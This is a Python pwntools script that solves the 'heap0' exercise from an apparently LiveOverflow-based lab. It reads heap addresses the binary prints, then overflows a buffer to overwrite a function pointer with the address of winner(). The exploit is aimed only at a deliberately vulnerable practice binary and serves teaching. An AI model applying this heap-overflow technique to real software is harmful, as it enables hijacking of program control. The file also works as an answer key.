#!/usr/bin/env python3

from __future__ import annotations

import re

from pwn import ELF, log, p32, process

import sys
from pathlib import Path

# Allow importing helper from repo's liveoverflow-labs/ directory.
sys.path.append(str(Path(__file__).resolve().parents[1]))
from pwn_solve import set_pwn_context  # noqa: E402


SUCCESS = b"level passed"


def main() -> int:
    set_pwn_context()

    # Binary is expected to be prebuilt (inside liveoverflow-pwn) and shared via volume.
    prog = str(Path(__file__).resolve().with_name("heap0"))
    elf = ELF(prog)

    winner = elf.symbols.get("winner")
    if not winner:
        log.failure("winner() not found")
        return 2

    # Run once to parse printed heap addresses (data/fp).
    io = process([prog, b"AAAA"])
    out = io.recvall(timeout=2)
    m = re.search(rb"data is at (0x[0-9a-fA-F]+), fp is at (0x[0-9a-fA-F]+)", out)
    if not m:
        log.failure("could not parse heap addresses")
        print(out.decode("ascii", "replace"))
        return 2
    d = int(m.group(1), 16)
    f = int(m.group(2), 16)
    dist = f - d
    if dist <= 0 or dist > 4096:
        log.failure("suspicious dist=%d", dist)
        return 2

    payload = b"A" * dist + p32(winner)
    io = process([prog, payload])
    out2 = io.recvall(timeout=2)
    if SUCCESS in out2:
        log.success("heap0 solved (dist=%d)", dist)
        return 0
    log.failure("heap0 failed")
    print(out2.decode("ascii", "replace"))
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
